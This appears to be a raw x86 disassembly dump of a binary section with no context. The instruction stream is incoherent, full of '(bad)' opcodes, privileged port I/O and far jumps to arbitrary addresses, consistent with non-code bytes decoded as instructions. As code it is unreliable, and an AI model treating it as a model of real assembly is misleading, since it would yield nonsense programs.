  415df6:	and    DWORD PTR [ebp-0x7cd21b7b],ebp
  415dfc:	mov    WORD PTR [esi-0x2f],?
  415dff:	and    DWORD PTR [edi-0x34cdd102],0x901b8573
  415e09:	pushf  
  415e0a:	sar    DWORD PTR [ecx+0x3d],cl
  415e0d:	jbe    0x415e5c
  415e0f:	loope  0x415e0b
  415e11:	(bad)
  415e15:	and    al,0x3
  415e17:	mov    ch,0xa
  415e19:	jno    0x415e04
  415e1b:	push   edi
  415e1c:	out    dx,eax
  415e1d:	test   esp,eax
  415e1f:	imul   ebx,DWORD PTR [ebx],0xffffffbd
  415e22:	mov    ds:0xb21cb063,al
  415e27:	cwde   
  415e28:	adc    eax,0x81a71c48
  415e2d:	jge    0x415e56
  415e2f:	adc    eax,0x69430941
  415e34:	mov    dh,0xf6
  415e36:	fisub  WORD PTR [edx+0x6f]
  415e39:	call   0xa6d31485
  415e3e:	xchg   DWORD PTR ds:0x6134330d,esp
  415e44:	jae    0x415e34
  415e46:	test   eax,0xd7ce9bbe
  415e4b:	fcomp  QWORD PTR [ebp-0x4bfaeb26]
  415e51:	test   eax,ebp
  415e53:	mov    ecx,0x4d904892
  415e58:	popf   
  415e59:	xor    eax,0xe678f499
  415e5e:	aam    0x88
  415e60:	dec    ebx
  415e61:	jae    0x415ec5
  415e63:	ss aas 
  415e65:	add    BYTE PTR [ebp+0x42757f49],bl
  415e6b:	nop
  415e6c:	out    0x64,al
  415e6e:	mov    ds:0xa523360c,al
  415e73:	imul   ebx,DWORD PTR ds:[eax-0x6c],0xffbf9d
  415e7b:	xchg   edx,eax
  415e7c:	shl    dh,cl
  415e7e:	icebp  
  415e7f:	jl     0x415ef5
  415e81:	pop    ds
  415e82:	out    dx,al
  415e83:	mov    dl,ch
  415e85:	pushf  
  415e86:	test   al,0x1
  415e88:	pop    eax
  415e89:	out    dx,eax
  415e8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e8b:	xor    bh,BYTE PTR [esi+0x6e844706]
  415e91:	sub    esp,ebx
  415e93:	fsubr  QWORD PTR [edx+0x52]
  415e96:	imul   ebp,DWORD PTR [eax+0x5dceed6],0xee7b9d84
  415ea0:	jno    0x415f16
  415ea2:	fdivrp st(1),st
  415ea4:	push   edx
  415ea5:	lea    edi,[esi-0x6c5a97c3]
  415eab:	jecxz  0x415f15
  415ead:	sub    BYTE PTR ds:0x608f8b47,dh
  415eb3:	in     eax,dx
  415eb4:	cmp    eax,0x118cd76b
  415eb9:	mov    al,ds:0x781382ac
  415ebe:	fwait
  415ebf:	pusha  
  415ec0:	push   ds
  415ec1:	imul   edx,DWORD PTR [ecx-0x72],0xffffff8d
  415ec5:	mov    es,ebp
  415ec7:	mov    ds:0xc780aae7,al
  415ecc:	ret    0xae06
  415ecf:	out    0xd4,eax
  415ed1:	jb     0x415f49
  415ed3:	(bad)  
  415ed4:	cwde   
  415ed5:	addr16 cmc 
  415ed7:	or     eax,DWORD PTR [eax]
  415ed9:	add    al,0xd1
  415edb:	hlt    
  415edc:	call   DWORD PTR [edx]
  415ede:	outs   dx,DWORD PTR ds:[esi]
  415edf:	pop    ecx
  415ee0:	aas    
  415ee1:	jg     0x415ece
  415ee3:	adc    DWORD PTR [esi+esi*4+0x69603f1b],0xffffffc1
  415eeb:	or     al,0xa0
  415eed:	(bad)  
  415eee:	imul   ecx,DWORD PTR [ebx],0xffffffc9
  415ef1:	inc    edi
  415ef2:	(bad)  
  415ef3:	push   edi
  415ef4:	dec    ebx
  415ef5:	pop    ds
  415ef6:	xchg   BYTE PTR [ebx],bl
  415ef8:	adc    eax,0x74a5ef8
  415efd:	pop    edx
  415efe:	icebp  
  415eff:	cli    
  415f00:	mov    BYTE PTR [esi+0x6a5b35a5],dl
  415f06:	xlat   BYTE PTR ds:[ebx]
  415f07:	in     eax,dx
  415f08:	mov    esi,0xd08bfdb
  415f0d:	push   edx
  415f0e:	jge    0x415f2f
  415f10:	mov    ebx,0xba497888
  415f15:	or     BYTE PTR [ecx],bh
  415f17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f18:	lock test ebp,ecx
  415f1b:	out    dx,al
  415f1c:	in     al,0x8f
  415f1e:	aam    0x13
  415f20:	adc    DWORD PTR [edi+0x58],edx
  415f23:	popf   
  415f24:	cmp    eax,0x8397067b
  415f29:	mov    ah,0x64
  415f2b:	mov    bh,0x34
  415f2d:	mov    DWORD PTR [ebp+0x1953c3a6],ecx
  415f33:	dec    esi
  415f34:	sbb    BYTE PTR [eax],ch
  415f36:	push   edx
  415f37:	push   0x809970f4
  415f3c:	pusha  
  415f3d:	pop    ss
  415f3e:	cli    
  415f3f:	dec    ebx
  415f40:	jle    0x415f1c
  415f42:	dec    eax
  415f43:	xchg   ecx,eax
  415f44:	(bad)  
  415f45:	xor    eax,0x677bd724
  415f4a:	imul   esi,DWORD PTR [edx],0x75499d71
  415f50:	or     al,0x9a
  415f52:	sar    BYTE PTR [esi],cl
  415f54:	jecxz  0x415f38
  415f56:	shl    DWORD PTR [eax+edx*1],cl
  415f59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f5a:	int    0x70
  415f5c:	in     eax,0x8c
  415f5e:	xor    BYTE PTR [ebp*4+0x37a01ba6],bh
  415f65:	js     0x415f4a
  415f67:	push   esp
  415f68:	ds hlt 
  415f6a:	push   edi
  415f6b:	push   0x49
  415f6d:	cld    
  415f6e:	daa    
  415f6f:	inc    esi
  415f70:	mov    eax,0x48cfda6b
  415f75:	lgs    ebp,FWORD PTR [ebp-0x46ec33f4]
  415f7c:	stos   BYTE PTR es:[edi],al
  415f7d:	inc    eax
  415f7e:	sbb    al,bh
  415f80:	cwde   
  415f81:	aas    
  415f82:	sbb    esi,DWORD PTR [esi-0x4742a69e]
  415f88:	pop    ds
  415f89:	push   edi
  415f8a:	xor    bh,dl
  415f8c:	not    DWORD PTR [esi+0x13e61e91]
  415f92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f93:	inc    ecx
  415f94:	adc    eax,0xd1c5c9be
  415f99:	aas    
  415f9a:	pop    esp
  415f9b:	or     BYTE PTR [ebp+0x2b],dl
  415f9e:	cwde   
  415f9f:	adc    cl,bh
  415fa1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415fa2:	jnp    0x415f60
  415fa4:	and    al,al
  415fa6:	pop    eax
  415fa7:	dec    esi
  415fa8:	cmp    BYTE PTR [edi-0x25],cl
  415fab:	xlat   BYTE PTR ds:[ebx]
  415fac:	retf   
  415fad:	and    al,ah
  415faf:	xchg   edi,eax
  415fb0:	fdivr  QWORD PTR [edx]
  415fb2:	out    0xca,al
  415fb4:	lahf   
  415fb5:	aad    0xd1
  415fb7:	sar    DWORD PTR [esi+edx*8],cl
  415fba:	sbb    DWORD PTR [eax-0x3e],ebx
  415fbd:	mov    al,ds:0xe7c6e100
  415fc2:	mov    sp,0x5061
  415fc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415fc7:	pushf  
  415fc8:	jne    0x415fbc
  415fca:	call   0xabdd:0xdd3a0741
  415fd1:	mov    ds:0xdb9cd3af,al
  415fd6:	jecxz  0x41604b
  415fd8:	or     BYTE PTR [ebp+eax*2+0x2905646a],ch
  415fdf:	shl    BYTE PTR [ebx+0x1e28e089],cl
  415fe5:	sub    ebp,ebp
  415fe7:	jb     0x415ffb
  415fe9:	jp     0x41601f
  415feb:	sub    dh,BYTE PTR [edi-0x6b3e139e]
  415ff1:	dec    ecx
  415ff2:	and    eax,0xe850de41
  415ff7:	adc    dh,bh
  415ff9:	test   eax,0xc7d82d54
  415ffe:	push   esi
  415fff:	pop    es
  416000:	mov    bh,0x91
  416002:	popa   
  416003:	(bad)  
  416004:	dec    eax
  416005:	call   0xb598:0x688ea435
  41600c:	mov    cs,WORD PTR [ecx+0xc4879e8]
  416012:	jno    0x416019
  416014:	dec    ebx
  416015:	cmp    eax,0x25f38abe
  41601a:	xchg   ecx,eax
  41601b:	imul   esp,DWORD PTR [edx-0x5a],0xe0639e89
  416022:	add    bl,BYTE PTR [ebp+0x63b6b03b]
  416028:	test   BYTE PTR [eax+0x55cb017f],cl
  41602e:	jbe    0x416047
  416030:	ss xor eax,0x9a9e192f
  416036:	jbe    0x416007
  416038:	(bad)  
  416039:	call   ebp
  41603b:	push   eax
  41603c:	std    
  41603d:	fisub  WORD PTR [eax]
  41603f:	jo     0x41606d
  416041:	mov    edi,0x68ab5cf4
  416046:	jg     0x415feb
  416048:	ins    BYTE PTR es:[edi],dx
  416049:	dec    edx
  41604a:	jle    0x416090
  41604c:	in     eax,dx
  41604d:	les    edi,FWORD PTR [edi-0x11b88e88]
  416053:	ret    0xc5ea
  416056:	xchg   esi,eax
  416057:	leave  
  416058:	and    BYTE PTR [ebp-0x57],bl
  41605b:	sbb    ebp,DWORD PTR [edi+0x6]
  41605e:	in     eax,0x95
  416060:	ret    
  416061:	ds (bad) 
  416064:	adc    al,BYTE PTR [ecx+0x64]
  416067:	outs   dx,BYTE PTR ds:[esi]
  416068:	and    ch,bl
  41606a:	aam    0x7d
  41606c:	jo     0x4160d9
  41606e:	ins    BYTE PTR es:[edi],dx
  41606f:	inc    ecx
  416070:	out    0x8b,eax
  416072:	repnz sbb DWORD PTR [esi-0x44c7b2fc],0xcf414ee9
  41607d:	iret   
  41607e:	xor    DWORD PTR [edi+esi*1-0x38],ebx
  416082:	cdq    
  416083:	jp     0x41602f
  416085:	adc    ebx,DWORD PTR [edx]
  416087:	(bad)  
  416088:	mov    edi,0x96e14d1e
  41608d:	pop    edi
  41608e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41608f:	stos   DWORD PTR es:[edi],eax
  416090:	dec    esp
  416091:	jnp    0x416079
  416093:	fs (bad) 
  416095:	js     0x416103
  416097:	xor    dl,dl
  416099:	js     0x4160ac
  41609b:	retf   0x48ac
  41609e:	sub    al,0x8a
  4160a0:	xor    cl,cl
  4160a2:	jnp    0x4160b5
  4160a4:	push   0x9c00efe5
  4160a9:	aaa    
  4160aa:	imul   ecx,DWORD PTR [edi-0x71],0x547f3968
  4160b1:	scas   al,BYTE PTR es:[edi]
  4160b2:	xchg   ecx,eax
  4160b3:	push   cs
  4160b4:	push   ebx
  4160b5:	pop    esp
  4160b6:	xor    al,0x23
  4160b8:	retf   0x5f41
  4160bb:	aad    0x4d
  4160bd:	gs loop 0x4160eb
  4160c0:	and    al,0x74
  4160c2:	push   ss
  4160c3:	dec    edx
  4160c4:	popa   
  4160c5:	pop    esi
  4160c6:	je     0x4160dc
  4160c8:	jmp    0x4a20a214
  4160cd:	sbb    esi,DWORD PTR [eax+0x52]
  4160d0:	xor    eax,0xf6807796
  4160d5:	mov    dl,dl
  4160d7:	sub    edx,ebx
  4160d9:	in     al,0xf9
  4160db:	pop    esp
  4160dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160dd:	ror    ebp,0x79
  4160e0:	shl    BYTE PTR [esi-0x2c4f1fc2],1
  4160e6:	icebp  
  4160e7:	adc    BYTE PTR [esi],al
  4160e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160ea:	push   ds
  4160eb:	pop    es
  4160ec:	(bad)  
  4160ed:	jl     0x4160cc
  4160ef:	sahf   
  4160f0:	cwde   
  4160f1:	mov    DWORD PTR [edi-0x4d],esp
  4160f4:	push   0x76
  4160f6:	fwait
  4160f7:	xor    bh,BYTE PTR [ecx]
  4160f9:	and    al,0xc3
  4160fb:	sub    al,ch
  4160fd:	add    eax,0x22ce3b1b
  416102:	cmp    esi,ecx
  416104:	fdivr  st(6),st
  416106:	iret   
  416107:	leave  
  416108:	jne    0x416117
  41610a:	jg     0x41610f
  41610c:	into   
  41610d:	repz jo 0x416156
  416110:	adc    al,0xaf
  416112:	jne    0x416187
  416114:	enter  0x61da,0xf7
  416118:	int3   
  416119:	imul   ebx,DWORD PTR [eax-0x6a9b98b6],0x72
  416120:	cmp    DWORD PTR [ebx-0x2],edi
  416123:	lods   eax,DWORD PTR ds:[esi]
  416124:	stc    
  416125:	sahf   
  416126:	and    eax,0x38c32a92
  41612b:	sub    DWORD PTR [edx+ebp*4],ecx
  41612e:	out    dx,eax
  41612f:	mov    ah,0xf8
  416131:	int3   
  416132:	repz cmp bl,BYTE PTR [eax-0x36e28c6d]
  416139:	test   eax,0x9ce377fe
  41613e:	ds push ds
  416140:	(bad)  
  416141:	mov    esi,0xa1899413
  416146:	popf   
  416147:	push   0xaa75778f
  41614c:	xchg   edi,eax
  41614d:	sti    
  41614e:	outs   dx,BYTE PTR ds:[esi]
  41614f:	jp     0x416190
  416151:	mov    ecx,0xd9f1c212
  416156:	jmp    0x4160e5
  416158:	sub    eax,0xca720e4f
  41615d:	sub    eax,0x427803d4
  416162:	mov    DWORD PTR [ebp-0x61fdd90c],esp
  416168:	push   ds
  416169:	cmp    eax,0x69b0ecfb
  41616e:	aaa    
  41616f:	sub    ch,BYTE PTR [ebp-0xbc90000]
  416175:	push   ecx
  416176:	jne    0x4161c2
  416178:	jp     0x416100
  41617a:	inc    edi
  41617b:	xchg   ecx,eax
  41617c:	adc    DWORD PTR [ecx-0x7ac949f9],0x11fcee58
  416186:	inc    ebp
  416187:	fadd   QWORD PTR [ebx-0x457e2df1]
  41618d:	dec    edi
  41618e:	out    dx,al
  41618f:	mov    ch,BYTE PTR fs:[edi-0x11]
  416193:	pop    ds
  416194:	mov    esi,0x925a91b9
  416199:	pushw  es
  41619b:	pop    edx
  41619c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41619d:	mov    WORD PTR [edi+0x4],ss
  4161a0:	mov    esi,0x1c40f155
  4161a5:	int3   
  4161a6:	fcmovbe st,st(6)
  4161a8:	out    0x78,eax
  4161aa:	and    esp,edx
  4161ac:	dec    ecx
  4161ad:	mov    cl,0x93
  4161af:	in     al,dx
  4161b0:	sub    dh,BYTE PTR [edi+edi*2]
  4161b3:	loop   0x41613f
  4161b5:	iret   
  4161b6:	pusha  
  4161b7:	in     eax,0x4b
  4161b9:	jo     0x416201
  4161bb:	and    eax,0xe537d171
  4161c0:	ret    
  4161c1:	add    esi,DWORD PTR [edx-0x44]
  4161c4:	imul   eax,esp,0xfffffff7
  4161c7:	fsubrp st(4),st
  4161c9:	outs   dx,DWORD PTR ds:[esi]
  4161ca:	in     al,0x5
  4161cc:	aas    
  4161cd:	lods   al,BYTE PTR ds:[esi]
  4161ce:	or     ecx,eax
  4161d0:	jo     0x4161cd
  4161d2:	push   edx
  4161d3:	cmc    
  4161d4:	test   BYTE PTR [edx],dl
  4161d6:	scas   eax,DWORD PTR es:[edi]
  4161d7:	rol    BYTE PTR [ecx],cl
  4161d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4161db:	fnsave [eax+ebp*4-0x4c]
  4161df:	sub    ebx,edi
  4161e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161e2:	nop
  4161e3:	push   0x9509b07c
  4161e8:	mov    ecx,0xa85ef6d1
  4161ed:	mov    dl,BYTE PTR [esi]
  4161ef:	arpl   di,bx
  4161f1:	addr16 pop ss
  4161f3:	int3   
  4161f4:	div    DWORD PTR [ebx-0x347b4fc2]
  4161fa:	pop    edx
  4161fb:	out    0x65,al
  4161fd:	pusha  
  4161fe:	adc    eax,DWORD PTR [ebx+0x5b]
  416201:	hlt    
  416202:	mov    ebx,0x35ddedac
  416207:	add    ecx,DWORD PTR [esi+0x1f930f0e]
  41620d:	adc    al,0x24
  41620f:	and    BYTE PTR [ecx-0x7290dfd6],dh
  416215:	in     al,dx
  416216:	out    dx,eax
  416217:	mov    dh,0xf4
  416219:	mov    ebx,0xe1d54dab
  41621e:	adc    edx,ecx
  416220:	push   edi
  416221:	test   DWORD PTR [edi-0x32],esi
  416224:	or     eax,esp
  416226:	lahf   
  416227:	and    ah,BYTE PTR [eax]
  416229:	leave  
  41622a:	fst    DWORD PTR [edx+edi*1-0x7066c42f]
  416231:	inc    esi
  416232:	push   esp
  416233:	mov    dl,0x37
  416235:	aas    
  416236:	xchg   esi,eax
  416237:	pusha  
  416238:	dec    ebp
  416239:	cmc    
  41623a:	inc    ecx
  41623b:	xor    ah,ah
  41623d:	push   edx
  41623e:	xlat   BYTE PTR ds:[ebx]
  41623f:	pop    eax
  416240:	mov    ah,0x1b
  416242:	jp     0x416251
  416244:	es push ss
  416246:	and    al,0x46
  416248:	mov    edi,0x992da369
  41624d:	outs   dx,BYTE PTR ds:[esi]
  41624e:	call   0xb1798eca
  416253:	inc    ebp
  416254:	jns    0x41628d
  416256:	je     0x4161e3
  416258:	dec    ecx
  416259:	iret   
  41625a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41625b:	pop    ds
  41625c:	adc    WORD PTR [eax+ecx*4],di
  416260:	adc    esi,DWORD PTR [edx-0x43b7647f]
  416266:	mov    esp,0x609b1de9
  41626b:	out    dx,eax
  41626c:	xchg   ebp,eax
  41626d:	in     eax,dx
  41626e:	jo     0x416202
  416270:	push   cs
  416271:	dec    ebx
  416272:	loopne 0x416236
  416274:	push   esi
  416275:	sti    
  416276:	and    DWORD PTR [ebp-0x1e8f5b9d],ebx
  41627c:	je     0x416256
  41627e:	cli    
  41627f:	pushf  
  416280:	sbb    DWORD PTR [esi],esi
  416282:	sbb    BYTE PTR [edi],0x9
  416285:	mov    bh,0x8d
  416287:	(bad)  
  416288:	xchg   esp,eax
  416289:	cli    
  41628a:	retf   0xd0ad
  41628d:	pop    ds
  41628e:	mov    eax,ds:0xb1b52969
  416293:	jecxz  0x4162c2
  416295:	xor    eax,0x50f46c86
  41629a:	int    0x5b
  41629c:	xor    bl,cl
  41629e:	jg     0x416315
  4162a0:	add    BYTE PTR [eax+0x21cadf9],bh
  4162a6:	adc    ch,bh
  4162a8:	xor    eax,0xed4fb363
  4162ad:	sbb    eax,0x88bd21e2
  4162b2:	adc    DWORD PTR [ecx],ebx
  4162b4:	adc    eax,0x937cdf7
  4162b9:	repnz fisttp DWORD PTR es:[ebx]
  4162bd:	pop    edx
  4162bf:	mov    bl,0xb5
  4162c1:	xchg   edx,eax
  4162c2:	sub    dh,BYTE PTR [edi-0x6b]
  4162c5:	call   0xa0ee:0x996aedc5
  4162cc:	cmp    DWORD PTR [ebx+0x21],0x60
  4162d0:	adc    eax,0x4c2a9a44
  4162d5:	mov    cl,0x2
  4162d7:	cmp    ebx,DWORD PTR [edx+0x55]
  4162da:	int3   
  4162db:	sub    DWORD PTR [ebp-0x6d35bbef],ecx
  4162e1:	(bad)  
  4162e2:	loopne 0x4162c8
  4162e4:	cmp    al,0x74
  4162e6:	jb     0x4162a7
  4162e8:	das    
  4162e9:	jbe    0x4162e0
  4162eb:	jge    0x416363
  4162ed:	inc    edx
  4162ee:	add    ebp,ebx
  4162f0:	cmp    eax,esi
  4162f2:	dec    eax
  4162f3:	cwde   
  4162f4:	es pop eax
  4162f6:	sub    esi,DWORD PTR [ecx-0x6c7bd588]
  4162fc:	ins    BYTE PTR es:[edi],dx
  4162fd:	jnp    0x416309
  4162ff:	aaa    
  416300:	iret   
  416301:	clc    
  416302:	sbb    DWORD PTR [ecx+ebp*8],ecx
  416305:	pop    edi
  416306:	sub    bl,BYTE PTR [eax+eiz*1+0x43]
  41630a:	mov    ebx,0xea08a254
  41630f:	inc    esp
  416310:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416311:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416312:	mov    edi,0xd47310e4
  416317:	add    esi,DWORD PTR [eax+0xe]
  41631a:	inc    ebx
  41631b:	js     0x416366
  41631d:	jecxz  0x416366
  41631f:	out    dx,eax
  416320:	and    bh,0xb
  416323:	dec    edi
  416324:	inc    esp
  416325:	jae    0x4162f2
  416327:	mov    dh,BYTE PTR [edi+0x74efe4a6]
  41632d:	push   0xffffffc3
  41632f:	stos   BYTE PTR es:[edi],al
  416330:	repnz mov eax,ds:0x10d4c040
  416336:	into   
  416337:	ror    BYTE PTR [ecx-0xc84a86a],1
  41633d:	dec    esp
  41633e:	adc    al,dh
  416340:	rcl    DWORD PTR [esi-0x51],cl
  416343:	int3   
  416344:	daa    
  416345:	and    edx,DWORD PTR [ebx+0x21be81a4]
  41634b:	mov    edi,0x9eb6233
  416350:	(bad)  
  416351:	push   edi
  416352:	pop    ds
  416353:	and    eax,0xb1a67f9
  416358:	ret    
  416359:	push   ss
  41635a:	mov    ?,WORD PTR [esi]
  41635c:	rcl    DWORD PTR [ebx],0xaf
  41635f:	bt     DWORD PTR [esi+0x61],ecx
  416363:	push   esi
  416364:	add    BYTE PTR fs:[esi+0x391faa80],ah
  41636b:	mov    esp,DWORD PTR [ebp+0x57c00110]
  416371:	dec    esp
  416372:	xchg   al,dh
  416374:	cmp    eax,DWORD PTR [edx-0x22dc09e2]
  41637a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41637b:	es lock ja 0x4163f7
  41637f:	jle    0x416324
  416381:	xchg   ebp,eax
  416382:	xchg   DWORD PTR [ebp-0x30],ebp
  416385:	ja     0x416338
  416387:	push   esi
  416388:	cmp    BYTE PTR [ebp-0x34c079f5],bl
  41638e:	sub    eax,0x4a1d1f52
  416393:	loop   0x4163a0
  416395:	pop    ss
  416396:	inc    ecx
  416397:	adc    ah,dl
  416399:	sub    eax,0x6ae58060
  41639e:	mov    eax,ds:0x807e732d
  4163a3:	mov    eax,es
  4163a5:	mov    edx,DWORD PTR [edi-0x13be5099]
  4163ab:	inc    eax
  4163ac:	sbb    ah,ch
  4163ae:	jb     0x416335
  4163b0:	js     0x416428
  4163b2:	xchg   esp,eax
  4163b3:	sub    ebp,DWORD PTR [ecx-0x5a57bc55]
  4163b9:	mov    ah,ch
  4163bb:	pop    es
  4163bc:	sbb    eax,0xb9644a22
  4163c1:	mov    edi,0xbcdf95fa
  4163c6:	mov    BYTE PTR [esi],al
  4163c8:	xor    eax,DWORD PTR [eax]
  4163ca:	xor    BYTE PTR [eax],bl
  4163cc:	sub    edx,DWORD PTR [ecx]
  4163ce:	dec    eax
  4163cf:	mov    ebp,DWORD PTR [esi+ebp*1]
  4163d2:	mov    ds:0xd4bc654e,al
  4163d7:	loope  0x4163c2
  4163d9:	pop    ss
  4163da:	sub    eax,0x58e2c51c
  4163df:	int    0x3a
  4163e1:	push   cs
  4163e2:	sbb    al,0x25
  4163e4:	cwde   
  4163e5:	mov    DWORD PTR [ebx+ecx*1+0xe4156ba],ebp
  4163ec:	push   0xffffffef
  4163ee:	sahf   
  4163ef:	(bad)
  4163f2:	add    esi,DWORD PTR ss:[ebx+0x39]
  4163f6:	mul    BYTE PTR [edi-0x72]
  4163f9:	push   0xffffffc6
  4163fb:	sub    al,0x9d
  4163fd:	jl     0x41644d
  4163ff:	mov    es:0x4b7f10ed,eax
  416405:	sti    
  416406:	or     al,0x7
  416408:	xchg   esi,eax
  416409:	mov    DWORD PTR [ecx],edi
  41640b:	jle    0x41646b
  41640d:	push   esi
  41640e:	jmp    0x416411
  416410:	mov    ebp,0x997bc042
  416415:	add    eax,0x5009e4dd
  41641a:	jnp    0x416486
  41641c:	(bad)  
  41641d:	in     eax,dx
  41641e:	sar    DWORD PTR [edi],1
  416420:	jle    0x4163cb
  416422:	push   edx
  416423:	hlt    
  416424:	repz out 0x70,eax
  416427:	sbb    eax,0x1a0b99aa
  41642c:	xor    edi,DWORD PTR [edi+0x7f4a7ed8]
  416432:	fisttp QWORD PTR [edi+0x358c3911]
  416438:	push   edx
  416439:	call   0x89694961
  41643e:	xor    eax,0xdc70b94f
  416443:	push   esp
  416444:	out    dx,eax
  416445:	gs (bad) 
  416447:	jge    0x4164c1
  416449:	cmp    eax,0x38c7ad48
  41644e:	pushf  
  41644f:	xor    al,0xfd
  416451:	or     al,0x55
  416453:	jae    0x416446
  416455:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416456:	jns    0x416449
  416458:	and    ah,al
  41645a:	sbb    ebp,DWORD PTR [edx-0x1f8b44f8]
  416460:	retf   0xa81e
  416463:	mov    ebx,DWORD PTR [ebx+edx*1]
  416466:	stos   BYTE PTR es:[edi],al
  416467:	push   eax
  416468:	or     esp,esi
  41646a:	add    al,0x41
  41646c:	push   ds
  41646d:	xchg   ecx,eax
  41646e:	mov    ax,0x7313
  416472:	adc    al,BYTE PTR [eax+0x7a]
  416475:	mov    ecx,DWORD PTR [edi]
  416477:	ror    ecx,cl
  416479:	pop    ss
  41647a:	popf   
  41647b:	inc    edx
  41647c:	pop    edx
  41647d:	js     0x416442
  41647f:	or     BYTE PTR [ecx-0x5b],0x2c
  416483:	inc    ebx
  416484:	test   BYTE PTR [ebp+0x30],bl
  416487:	clc    
  416488:	mov    ds:0x62f6eb70,eax
  41648d:	lods   al,BYTE PTR ds:[esi]
  41648e:	mov    ah,0xc2
  416490:	ror    ah,0x7b
  416493:	push   ss
  416494:	out    0xaa,al
  416496:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416497:	or     bl,BYTE PTR [ebx+ebp*8-0x24803189]
  41649e:	adc    al,0x30
  4164a0:	adc    bh,BYTE PTR [edx-0x9]
  4164a3:	in     eax,dx
  4164a4:	xor    ebp,DWORD PTR [esi-0x30d1348c]
  4164aa:	in     eax,dx
  4164ab:	sbb    dh,BYTE PTR [ebp-0x54]
  4164ae:	outs   dx,DWORD PTR ds:[esi]
  4164af:	shr    DWORD PTR [eax-0x60],cl
  4164b2:	dec    esi
  4164b3:	icebp  
  4164b4:	or     DWORD PTR [edi+eiz*1-0x73],0x44
  4164b9:	mov    ebp,0xce6645fc
  4164be:	out    0x21,eax
  4164c0:	(bad)  
  4164c1:	jle    0x41650b
  4164c3:	mov    ecx,cr7
  4164c6:	sahf   
  4164c7:	jb     0x416456
  4164c9:	cli    
  4164ca:	outs   dx,BYTE PTR ds:[esi]
  4164cb:	mov    bl,BYTE PTR [ecx+0x6133fa1]
  4164d1:	and    bh,BYTE PTR [edi]
  4164d3:	jns    0x416481
  4164d5:	cli    
  4164d6:	(bad)  
  4164d7:	jbe    0x416516
  4164d9:	loopne 0x41653f
  4164db:	or     eax,0xb0318cf2
  4164e0:	xchg   edx,eax
  4164e1:	into   
  4164e2:	imul   eax,DWORD PTR [edi+0x4928215a],0xfffffffe
  4164e9:	mov    cl,0xc9
  4164eb:	scas   al,BYTE PTR es:[edi]
  4164ec:	mov    es,eax
  4164ee:	adc    ch,BYTE PTR [edi+0x42]
  4164f1:	cmp    BYTE PTR [ebp-0x2c94b19e],ch
  4164f7:	mov    edi,0x5e01dba0
  4164fc:	jae    0x416550
  4164fe:	ret    0xf209
  416501:	jbe    0x41649a
  416503:	mov    eax,0x6287c14d
  416508:	xlat   BYTE PTR ds:[ebx]
  416509:	adc    DWORD PTR [edi],eax
  41650b:	fdivr  st,st(5)
  41650d:	add    eax,0x12e2bb61
  416512:	fnsave [edi-0x19]
  416515:	fs lock scas eax,DWORD PTR es:[edi]
  416518:	mov    eax,ds:0x818d0139
  41651d:	icebp  
  41651e:	push   edi
  41651f:	sub    dh,bh
  416521:	xchg   ebx,eax
  416522:	out    dx,al
  416523:	inc    edi
  416524:	addr16 add eax,0x80e98447
  41652a:	and    BYTE PTR [ecx],al
  41652c:	cdq    
  41652d:	in     al,0x58
  41652f:	mov    esi,0x8d464fb0
  416534:	add    al,0x2a
  416536:	es (bad) 
  416538:	hlt    
  416539:	sub    BYTE PTR [eax*1-0x2045053b],dh
  416540:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416541:	xchg   ebx,eax
  416542:	out    0xfc,al
  416544:	sub    BYTE PTR [esi-0x2e],al
  416547:	aad    0xa3
  416549:	sbb    al,0xb5
  41654b:	out    0x1d,al
  41654d:	push   edi
  41654e:	xchg   BYTE PTR [edx+0x2d3f31b4],dh
  416554:	sar    BYTE PTR [edx+edx*8-0x16],0x8e
  416559:	(bad)  
  41655a:	xor    dh,BYTE PTR [edi-0x49]
  41655d:	(bad)  
  41655e:	into   
  41655f:	pop    ss
  416560:	dec    ebx
  416561:	fldz   
  416563:	pop    ebx
  416564:	out    dx,eax
  416565:	das    
  416566:	and    al,0xd9
  416568:	push   edi
  416569:	mov    edi,0xe6458f1c
  41656e:	out    0x2d,al
  416570:	or     eax,esi
  416572:	xor    ecx,DWORD PTR [ebx+0x2ecc08f1]
  416578:	jne    0x4165b3
  41657a:	pop    eax
  41657b:	mov    ch,0xae
  41657d:	cdq    
  41657e:	test   eax,0x70349bd8
  416583:	fwait
  416584:	pop    ecx
  416585:	mov    eax,0xebdbb17b
  41658a:	ds (bad) 
  41658c:	mov    ebp,0xa23918b9
  416591:	dec    esi
  416592:	or     bh,BYTE PTR fs:[edi-0x7607f782]
  416599:	lahf   
  41659a:	stos   DWORD PTR es:[edi],eax
  41659b:	(bad)  
  41659c:	jmp    0xed2ff921
  4165a1:	push   esp
  4165a2:	xchg   ecx,eax
  4165a3:	fs arpl di,bx
  4165a6:	(bad)  
  4165a7:	mov    ebp,0xc98c3804
  4165ac:	mov    WORD PTR [edi+ebx*2+0x42f00ffd],?
  4165b3:	aam    0x21
  4165b5:	mov    esp,0x35666189
  4165ba:	popa   
  4165bb:	pop    edx
  4165bc:	sbb    ecx,ebx
  4165be:	inc    eax
  4165bf:	jmp    DWORD PTR [edi]
  4165c1:	popa   
  4165c2:	mov    al,0x6a
  4165c4:	repnz mov ecx,DWORD PTR [eax+0x14]
  4165c8:	sbb    al,0x10
  4165ca:	jnp    0x416573
  4165cc:	pop    ebp
  4165cd:	gs ret 0x7667
  4165d1:	and    DWORD PTR [edi-0x38a9e3ee],ecx
  4165d7:	xchg   ecx,eax
